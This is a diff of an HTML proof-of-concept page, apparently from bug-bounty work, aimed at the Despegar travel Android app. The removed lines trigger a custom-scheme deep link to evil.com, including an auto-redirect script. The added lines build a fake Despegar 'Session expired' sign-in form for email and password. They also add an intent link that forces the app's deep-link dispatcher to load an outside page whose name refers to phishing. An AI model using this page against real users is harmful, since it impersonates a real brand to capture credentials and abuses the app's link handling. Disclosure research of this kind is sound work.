@@ -1,20 +1,73 @@
 <!DOCTYPE html>
-<html>
-<head><title>Despegar PoC</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Despegar - Sign In</title>
+  <style>
+    body { 
+      font-family: Arial, sans-serif; 
+      text-align: center; 
+      padding: 40px 20px; 
+      background: #f8f9fa; 
+      margin: 0;
+    }
+    .logo { 
+      font-size: 32px; 
+      color: #e30613; 
+      font-weight: bold; 
+      margin-bottom: 20px; 
+    }
+    h3 { margin: 10px 0 25px; color: #333; }
+    input { 
+      display: block; 
+      margin: 12px auto; 
+      padding: 14px; 
+      width: 280px; 
+      border: 1px solid #ddd; 
+      border-radius: 8px; 
+      font-size: 16px; 
+    }
+    button { 
+      margin-top: 10px; 
+      padding: 14px 50px; 
+      background: #e30613; 
+      color: white; 
+      border: none; 
+      border-radius: 8px; 
+      font-size: 17px; 
+      cursor: pointer;
+    }
+    p { 
+      font-size: 13px; 
+      color: #666; 
+      margin: 20px 0;
+    }
+    .trigger { 
+      display: inline-block; 
+      margin-top: 25px; 
+      padding: 14px 35px; 
+      background: #e30613; 
+      color: white; 
+      border-radius: 8px; 
+      font-size: 16px; 
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .trigger:hover { background: #c00510; }
+  </style>
+</head>
 <body>
-<h2>Tap below</h2>
-
-<!-- Method 1: Custom scheme - works in ALL browsers -->
-<a href="despegar.app://evil.com">Trigger via despegar.app scheme</a>
-
-<br><br>
-
-<!-- Method 2: Auto trigger -->
-<script>
-  setTimeout(() => {
-    window.location = "despegar.app://evil.com";
-  }, 1000);
-</script>
-
+  <div class="logo">✈️ Despegar</div>
+  <h3>Sign in to continue</h3>
+  <input type="email" placeholder="Email address" />
+  <input type="password" placeholder="Password" />
+  <button>Sign In</button>
+  
+  <p><strong>Session expired.</strong><br>Please log in again to continue.</p>
+  
+  <a class="trigger" href="intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.url=https://honestcorrupt.github.io/poc_repo_for_phishing//;end">
+    Open in Despegar App
+  </a>
 </body>
 </html>
